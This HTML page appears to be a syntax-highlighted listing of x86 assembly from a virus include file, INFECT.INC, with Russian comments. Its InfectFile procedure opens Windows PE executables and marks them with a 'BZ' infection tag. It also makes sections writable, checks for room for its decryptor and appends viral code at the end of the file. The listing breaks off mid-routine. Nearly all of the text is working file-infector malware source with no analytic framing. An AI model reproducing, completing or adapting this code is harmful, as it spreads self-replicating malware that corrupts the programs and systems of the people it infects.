<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>INFECT.INC</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">InfectFile</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckName</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">nextone</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">GetFileAttributes</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fattr</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc1">; Uncomment for *NOT* test purposes :)</span><span class="sc0">
</span><span class="sc1">;   Call    [SetFileAttributes][ebp],edx,80h    </span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">cFileName</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Откроем</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">CreateFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc5">SHARE_READ</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Низзя ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">nextone</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Читаем header</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CloseIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'ZB'</span><span class="sc0">            </span><span class="sc1">; BZ есть ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">12h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseIt</span><span class="sc0">             </span><span class="sc1">; Есть...иначе запишем 'BZ'</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">12h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Тоесть если мы его сейчас</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; не заразим - дальше и пытатся</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; не будем,а метку заражения</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; оставим. Экономия времени</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">3Ch</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peh</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; на PE заголовок</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Читаем</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">            </span><span class="sc1">; PE ?</span><span class="sc0">
    </span><span class="sc6">scasd</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CloseIt</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; Получим позицию</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">6</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Читаем секции</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mpos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">; На ее physical offset</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">xVic</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; А она не меньше чем нуно ?</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">CloseIt</span><span class="sc0">             </span><span class="sc1">; Меньше,ну ее</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rinf</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">old5</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Читаем 2 кило</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Ее RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; + ImageBase = VA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">oldpos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Сохранили</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">   </span><span class="sc1">; +Write</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">6</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Пропускаем секции</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">80h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">LoadSect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Ее RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; + размер</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">smaller</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Пока самое большое</span><span class="sc0">
</span><span class="sc5">smaller</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;-----------</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">notimport</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notimport</span><span class="sc0">
</span><span class="sc1">;-----------</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">      </span><span class="sc1">; +Write</span><span class="sc0">
</span><span class="sc5">notimport</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A0h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">notreloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A0h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">notreloc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TryReloc</span><span class="sc0">
</span><span class="sc5">notreloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoadSect</span><span class="sc0">

</span><span class="sc10">all</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rinf</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">RelocInfect</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">mpos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">fsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">78h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; А мы ничего не затрем,если</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">xVic</span><span class="sc0">
</span><span class="sc5">Checkit</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; добавим секцию ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">undefined</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">CloseIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; А никакая фигня не затрет</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">CloseIt</span><span class="sc0">             </span><span class="sc1">; наш декриптор ?</span><span class="sc0">
</span><span class="sc5">undefined</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Checkit</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; в конец</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; File Padding соблюдается ?</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoPad</span><span class="sc0">               </span><span class="sc1">; Угу</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">main</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Придется мусором забить</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NoPad</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; В конец файла</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ipos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Сохраним позицию</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; Наш новый RVA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">38h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; Не надо подправлять ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">skipit</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ww</span><span class="sc0">
</span><span class="sc5">skipit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
